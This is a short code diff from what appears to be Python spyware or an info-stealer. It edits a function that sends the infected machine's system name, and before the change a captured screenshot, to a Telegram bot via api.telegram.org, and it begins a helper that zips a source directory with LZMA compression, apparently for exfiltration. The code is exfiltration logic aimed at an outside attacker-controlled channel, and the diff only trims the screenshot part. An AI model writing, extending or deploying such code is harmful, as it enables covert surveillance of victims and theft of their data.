@@ -1,11 +1,9 @@
-                def send_message_to_group(chat_id, screenshot):
+                def send_message_to_group(chat_id):
                     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
                     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
                     image_buffer = BytesIO()
-                    screenshot.save(image_buffer, format='JPEG')
                     image_buffer.seek(0)
-                    files = {'photo': ('screenshot.jpg', image_buffer)}
-                    response = requests.post(url, data=data, files=files)
+                    response = requests.post(url, data=data)
                 def create_zip_archive(source_dir, output_zip):
                     try:
                         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA,
